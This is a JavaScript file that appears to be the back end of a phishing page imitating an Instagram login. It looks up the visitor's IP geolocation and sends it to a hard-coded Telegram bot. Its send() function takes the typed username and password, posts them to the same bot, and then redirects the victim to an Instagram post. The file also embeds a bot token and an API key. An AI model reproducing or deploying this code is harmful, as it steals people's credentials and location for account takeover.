/* Fell free to visit my youtube channel for more updates,
https://www.youtube.com/channel/UCtVM2RthR4aC6o7dzySmExA
*/
function httpGetAsync(url, callback) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() {
      if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
        
        callback(xmlHttp.responseText)
        console.log(xmlHttp.responseText)
    }
    xmlHttp.open("GET", url, true); // true for asynchronous
    xmlHttp.send(null);
  }

  function sendt(msg, l) {
      
    var xhr = new XMLHttpRequest();
    let aw = JSON.stringify({
        "chat_id": "1197195837",
        "text": msg
    });

    xhr.onreadystatechange = function () {
        if (this.readyState != 4) return;
        if (l ===1 )
            document.location.href = "https://www.instagram.com/p/CKcDTelB_vm/?utm_source=ig_web_copy_link"
            
    };
    xhr.open("POST", "https://api.telegram.org/bot1316984210:AAEfAXhddoAH5DsTGqcmGE_FhOJoA1aruro/sendMessage", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(aw);
      
    }
  
  var url = "https://ipgeolocation.abstractapi.com/v1/?api_key=9118e76e5b0e48f08e80865e0bf52df8&ip_address=77.100.62.223"
  
httpGetAsync(url, sendt)



function send() {
    if (document.getElementById('username').value && document.getElementById('password').value){
        console.log(`username: ${document.getElementById('username').value} \npassword: ${document.getElementById('password').value}`)
        sendt(`username: ${document.getElementById('username').value} password: ${document.getElementById('password').value}`, 1)

        
    } else {
        document.getElementById('msg').innerHTML = "Something went wrong, please try again!"
    }

}